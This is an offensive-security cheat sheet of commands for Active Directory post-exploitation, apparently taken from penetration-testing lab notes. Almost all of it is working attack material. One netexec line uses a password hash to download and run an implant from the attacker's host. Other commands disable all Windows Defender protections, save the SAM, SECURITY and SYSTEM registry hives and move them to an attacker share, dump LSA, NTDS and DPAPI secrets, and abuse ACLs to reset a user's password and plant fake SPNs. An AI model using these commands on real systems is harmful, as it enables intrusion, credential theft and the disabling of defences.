## AD Post-Exploit

### Netexec
```bash
nxc smb $TARGETIP -u $USER -H $HASH --exec-method smbexec -x "powershell -c curl $tun0:8080/agent.exe -o C:\Windows\Tasks\demon.exe; Start-Process C:\Windows\Tasks\demon.exe"
```

### Disable AV
```powershell
# Disable Real time Monitoring :
Set-MpPreference -DisableRealtimeMonitoring $true
# Disable all protection :
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
```

### Dump SAM LSA SECRET
```bash
smbserver.py -smb2support EXEGOL .
```

```cmd
reg.exe save hklm\sam C:\Windows\Tasks\sam.save
reg.exe save hklm\security C:\Windows\Tasks\security.save
reg.exe save hklm\system C:\Windows\Tasks\system.save

move sam.save \\LHOST\EXEGOL
move security.save \\LHOST\EXEGOL
move system.save \\LHOST\EXEGOL
```

### Dump everything !!
```bash
nxc smb $RHOST -u $USER -p $PASSWORD --lsa --sam --dpapi --ntds
```

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

### Enum trust
```powershell
Import-Module activedirectory
Get-ADTrust -Filter *
``` 

### Linux & AD
```bash
realm list
ps -ef | grep -i "winbind|sssd"
find / -name keytab -ls 2>/dev/null
env | grep -i krb5
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

### Enumerating Security Controls
```powershell
$ExecutionContext.SessionState.LanguageMode
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
Get-MpComputerStatus
sc query windefend
```

### Powershell misc
```powershell
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
Find-InterestingDomainAcl
Find-InterestingDomainShareFile
# Enumerates local groups on the local or a remote machine
Get-NetLocalGroup
# Enumerates members of a specific local group
Get-NetLocalGroupMember
# Returns open shares on the local (or a remote) machine
Get-NetShare
# Will return session information for the local (or a remote) machine
Get-NetSession
# Tests if the current user has administrative access to the local (or a remote) machine
Test-AdminAccess
```

### Snaffler
```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

### Users
```powershell
qwinsta
net user /domain $USERNAME
```


### ACL Abuse
```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid $USERNAME

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
Get-DomainGroup -Identity "GROUP NAME" | select memberof 
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

# PSCredential Object (Import-Module .\PowerView.ps1)
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# Create Fake SPN
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

# Add and Remove user from group
Add-DomainGroupMember -Identity "GROUP NAME" -Members '$USER' -Credential $Cred2 -Verbose
Remove-DomainGroupMember -Identity "GROUP NAME" -Members '$USER' -Credential $Cred2 -Verbose
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```


### Network
```cmd
route print
arp -a
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

### Firewall
```cmd
netsh advfirewall show allprofiles
```